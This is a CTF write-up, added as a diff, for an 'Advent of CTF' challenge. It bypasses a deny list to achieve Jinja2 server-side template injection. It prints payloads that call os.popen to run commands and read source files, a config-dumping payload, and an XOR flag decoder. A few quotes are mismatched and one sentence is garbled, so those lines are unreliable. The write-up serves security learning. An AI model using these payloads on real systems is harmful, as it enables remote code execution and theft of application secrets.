@@ -1,0 +1,87 @@
+#+TITLE: Advent of CTF - Challenge 17
+#+SUBTITLE: "Gatekeeper"
+
+* Challenge
+
+This challenge is the same as [[../challenge-16/index.org][Challenge 16]], but now the input is heavily filtered.
+
+What you will learn:
+
+- Bypassing filters
+
+* Solution
+:PROPERTIES:
+:ATTACH_DIR: /home/arjen/Projects/credmp.github.io/writeups/advent-of-ctf/challenge-17/index_att
+:END:
+
+#+CAPTION: The start of the challenge
+[[file:index_att/start.png]]
+
+Attempting to use the same payloads as before will result in an error message saying that the entered emoji is on a deny list.
+
+#+CAPTION: Denied
+[[file:index_att/denied.png]]
+
+Apparently there is some form of character checking happening. Running through various combinations will lead to a list of =._"= and the word =config=.
+
+In fact, in the challenge code this is implemented as following:
+
+#+CAPTION: The not allowed characters
+#+begin_src python
+if ".' in p or '_' in p or "'" in p or 'config' in p:
+#+end_src
+
+The cheat sheet on [[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---filter-bypass][Payload All The Things]] has a great reference on bypassing filters. Following this guide will get you most of the way. The final payload that is suggested is:
+
+#+CAPTION: Payload all the things payload
+#+begin_src javascript
+{{request|attr("application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')
+('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|
+attr('popen')('id')|attr('read')()}}
+#+end_src
+
+But obviously there are illegal characters in it. The ="= can be replaced with ="= however and this payload will work.
+
+#+CAPTION: Adjusted payload for allowed characters
+#+begin_src javascript
+{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")
+  ("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|
+  attr("popen")("id")|attr("read")()}}
+#+end_src
+
+#+CAPTION: Bypassing the deny list
+[[file:index_att/ssti-bypass-id.png]]
+
+From here the challenge is the same as the previous one.
+
+#+CAPTION: Payload to get the sources
+#+begin_src javascript
+{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")
+  ("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|
+  attr("popen")("cat app**")|attr("read")()}}
+#+end_src
+
+The source does not contain the flag however, this needs to be taken from the =config= variable again. Searching the internet will yield several ways of accessing the config dictionary. Below is one.
+
+#+CAPTION: A bypass for config
+#+begin_src javascript
+{{self|attr("\x5f\x5fdict\x5f\x5f")}}
+#+end_src
+
+In the source code the magic function is just a little bit different from the last one, but the proces is the same; extract from the source and run in a python shell.
+
+#+CAPTION: The magic function
+#+begin_src python
+def magic(flag, key): 
+    return ''.join(chr(x ^ ord(flag[x]) ^ ord(key[x]) ^ ord(key[::-1][x])) for x in range(len(flag)))
+ 
+flag="C\x1eS\x1dwsef}j\x057i\x7fo{D)'dO,+sutm3F"
+magic(flag, "46e505c983433b7c8eefb953d3ffcd196a08bbf9")
+#+end_src
+
+Go and get the badge as well.
+
+[[./index_att/badge.png]]
+
+
+Go back to the [[../../../index.org][homepage]].
